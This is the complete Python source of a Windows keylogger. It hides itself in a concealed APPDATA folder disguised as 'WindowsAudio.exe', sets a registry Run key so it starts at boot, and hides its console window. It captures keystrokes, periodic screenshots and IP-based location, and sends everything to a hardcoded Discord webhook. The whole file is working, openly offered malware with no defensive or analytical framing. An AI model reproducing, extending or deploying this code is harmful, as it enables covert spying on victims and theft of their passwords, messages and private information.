import os
import sys
import requests
import time
import threading
import socket
import ctypes
import winreg
import pyautogui
import geocoder
from pynput.keyboard import Listener
from datetime import datetime

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1378631702854766612/cV2SCk8HACGYS-0waB4UuEkvd_iC0vmeKyttEM6DIDCeci498WbU9ZAh9WwIHa7Op2I_"
MAX_KEYS = 1000
SEND_INTERVAL = 60  # Seconds between keylogs
SCREENSHOT_INTERVAL = 300  # 5 minutes
LOCATION_INTERVAL = 3600  # 1 hour

class UniversalKeylogger:
    def __init__(self):
        self.keys = []
        self.username = os.getenv('USERNAME', 'UNKNOWN')
        self.hostname = socket.gethostname()
        self.appdata = os.getenv('APPDATA')
        
        # Handle PyInstaller temp folder when running as executable
        if getattr(sys, 'frozen', False):
            self.install_path = os.path.join(self.appdata, 'WindowsAudio')
        else:
            self.install_path = os.path.dirname(os.path.abspath(sys.executable))
        
        # Setup
        self.setup_environment()
        self.send_startup_message()

    def setup_environment(self):
        """Create hidden directory and set persistence"""
        try:
            if not os.path.exists(self.install_path):
                os.makedirs(self.install_path)
                # Hide folder
                ctypes.windll.kernel32.SetFileAttributesW(self.install_path, 2)
            
            # If running as executable, copy self to install path
            if getattr(sys, 'frozen', False):
                dest_path = os.path.join(self.install_path, 'WindowsAudio.exe')
                if not os.path.exists(dest_path) or os.path.getsize(dest_path) != os.path.getsize(sys.executable):
                    with open(sys.executable, 'rb') as src:
                        with open(dest_path, 'wb') as dst:
                            dst.write(src.read())
                    ctypes.windll.kernel32.SetFileAttributesW(dest_path, 2)
            
            # Add to startup
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(
                    key, 
                    "WindowsAudio", 
                    0, 
                    winreg.REG_SZ, 
                    os.path.join(self.install_path, 'WindowsAudio.exe')
                )
                winreg.CloseKey(key)
            except Exception as e:
                self.log_error(f"Registry error: {e}")
            
            # Hide console
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            
        except Exception as e:
            self.log_error(f"Setup failed: {e}")

    def log_error(self, error):
        """Log errors to file"""
        with open(os.path.join(self.install_path, 'errors.log'), 'a') as f:
            f.write(f"[{datetime.now()}] {error}\n")

    def send_to_webhook(self, content, is_file=False):
        """Send data to Discord webhook"""
        try:
            if is_file:
                with open(content, 'rb') as f:
                    requests.post(WEBHOOK_URL, files={'file': f}, timeout=20)
            else:
                requests.post(WEBHOOK_URL, json={"content": content}, timeout=15)
            return True
        except Exception as e:
            self.log_error(f"Webhook error: {e}")
            return False

    def send_startup_message(self):
        """Send initial info with location"""
        location = self.get_location()
        msg = (
            f"🟢 **Keylogger Active**\n"
            f"**User:** {self.username}\n"
            f"**PC:** {self.hostname}\n"
            f"**IP:** {location.get('ip', 'Unknown')}\n"
            f"**Location:** {location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}\n"
            f"**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        self.send_to_webhook(msg)

    def capture_screen(self):
        """Take screenshot and return path"""
        try:
            screenshot = pyautogui.screenshot()
            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            path = os.path.join(self.install_path, filename)
            screenshot.save(path)
            return path
        except Exception as e:
            self.log_error(f"Screenshot failed: {e}")
            return None

    def get_location(self):
        """Get approximate location via IP"""
        try:
            g = geocoder.ip('me')
            return {
                'ip': g.ip,
                'city': g.city,
                'country': g.country,
                'latlng': g.latlng
            }
        except Exception as e:
            self.log_error(f"Location error: {e}")
            return {}

    def on_press(self, key):
        """Handle key presses"""
        try:
            special_keys = {
                'Key.space': ' ',
                'Key.enter': '\n[ENTER]\n',
                'Key.backspace': '[BS]',
                'Key.tab': '[TAB]',
                'Key.esc': '[ESC]'
            }
            
            key_str = str(key)
            self.keys.append(special_keys.get(key_str, key_str.replace("'", "")))
            
            if len(self.keys) >= MAX_KEYS:
                self.send_keys()
                
        except Exception as e:
            self.log_error(f"Key error: {e}")

    def send_keys(self):
        """Send collected keystrokes"""
        if not self.keys:
            return
            
        keys = ''.join(self.keys)
        self.keys = []
        
        if not self.send_to_webhook(f"```\n{keys}\n```"):
            # Fallback to local storage
            with open(os.path.join(self.install_path, 'keys.log'), 'a') as f:
                f.write(f"\n[{datetime.now()}]\n{keys}")

    def start(self):
        """Main keylogger loop with threads"""
        def key_sender():
            while True:
                time.sleep(SEND_INTERVAL)
                self.send_keys()

        def screenshot_capture():
            while True:
                time.sleep(SCREENSHOT_INTERVAL)
                screen_path = self.capture_screen()
                if screen_path:
                    self.send_to_webhook("📸 **Screenshot Captured**", is_file=screen_path)
                    try:
                        os.remove(screen_path)  # Clean up
                    except:
                        pass

        def location_tracker():
            while True:
                time.sleep(LOCATION_INTERVAL)
                location = self.get_location()
                if location:
                    self.send_to_webhook(
                        f"📍 **Location Update**\n"
                        f"IP: `{location.get('ip', 'Unknown')}`\n"
                        f"City: `{location.get('city', 'Unknown')}`\n"
                        f"Country: `{location.get('country', 'Unknown')}`\n"
                        f"Coordinates: `{location.get('latlng', 'Unknown')}`"
                    )

        # Start all threads
        threading.Thread(target=key_sender, daemon=True).start()
        threading.Thread(target=screenshot_capture, daemon=True).start()
        threading.Thread(target=location_tracker, daemon=True).start()

        # Keyboard listener
        with Listener(on_press=self.on_press) as listener:
            try:
                listener.join()
            finally:
                self.send_to_webhook("🔴 Keylogger Stopped")

if __name__ == "__main__":
    try:
        logger = UniversalKeylogger()
        logger.start()
    except Exception as e:
        with open(os.path.join(os.getenv('APPDATA'), 'WindowsAudio', 'crash.log'), 'a') as f:
            f.write(f"[CRASH {datetime.now()}] {str(e)}\n")